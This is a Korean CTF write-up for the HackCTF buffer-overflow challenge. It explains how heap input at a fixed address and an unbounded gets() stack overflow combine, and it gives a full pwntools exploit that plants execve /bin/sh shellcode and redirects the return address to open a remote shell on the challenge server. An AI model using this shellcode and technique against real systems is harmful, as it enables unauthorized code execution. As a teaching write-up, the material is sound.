---
title: "HackCTF 내 버퍼가 넘쳐흐른다 Write-Up"
tags: [wargame]
categories: ["System"]
---

# Index

1. [문제 분석](#문제-분석)

* * *

## 문제 분석

이전 문제들과 다르게 문제의 제목을 통해서 예측하기엔 추상적인 내용을 담고 있었습니다. 프로그램을 실행해보면 두 번의 입력을 받는 것과 각각 Name, input 내용을 입력 받음을 확인할 수 있었습니다.

```
root@3218f793af99:~/hackctf/prob# ./prob1
Name : persian
input : Test
```

입력을 받고 별도의 출력값은 없었습니다. 문제의 제목을 보면 아마도 overflow 취약점은 있지 않을까 싶어 각각 입력값에 대한 overflow 조건을 확인해보기 위해 많은 값을 입력해보았습니다.

두 입력 모두 overflow가 발생하는 것을 확인하였지만 차이가 있었습니다.

1. 첫 번째 입력에서 범위 이상의 값을 입력했을 경우 두 번째 입력에서 별도로 입력받지 않고 Segmentation fault가 발생
2. 두 번째 입력에서 범위 이상의 값을 입력했을 경우에도 마찬가지로 Segmentation fault 발생

1번 결과를 더 분석해보면 첫 번째 입력에서 overflow 된 값이 두 번째 입력에도 사용되어 이때 또한 overflow가 발생하여 Segmentation fault가 발생하였을 것으로 예상되었습니다.

## GDB 분석

GDB를 이용한 분석을 진행하며 프로그램의 구조를 알 수 있었고 Exploit을 위한 payload를 구성할 수 있었습니다. 우선 첫 번째 입력의 경우 Heap 공간에, 두 번째 입력의 경우 지역 변수에 값을 저장하였습니다.

Overflow 공격에 있어서 Heap과 Stack의 가장 큰 차이점은 ret 주소를 직접 변조하는 것이 가능한지, 아닌지입니다. 첫 번째 입력의 경우 read 함수를 사용하여 50 Byte까지 입력이 가능하였으며 두 번째는 gets 함수를 이용해 제한 없이 입력이 가능하였습니다.

Heap memory 영역에 저장되는 주소가 고정되어 있다는 점을 이용하여 첫 번째 입력에서 shellcode를 삽입하고 ret 조작이 가능한 stack overflow를 통해 해당 주소로 흐름을 조작할 수 있도록 payload를 작성하였습니다.

## Exploit

최종적으로 작성한 exploit code는 다음과 같습니다.

```python
#!/usr/bin/python3

import pwn 

p = pwn.remote("ctf.j0n9hyun.xyz", 3003)
pwn.context.log_level = 'debug'

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
name = 0x804a060
padding = b"A"*24

payload = b"\x90"*10
payload += shellcode
payload += b"\x90"*5
p.sendlineafter("Name : ", payload)

payload = padding
payload += pwn.p32(name)
p.sendlineafter("input : ", payload)

p.interactive()
```

padding의 경우 main의 초반부에서 `sub esp, 0x14`를 통해 stack의 공간을 확보하는 것을 통해 0x14를 buf의 크기로 잡고 여기에 sfp 4 byte를 더해 0x18 즉, 24 byte로 구하였습니다.
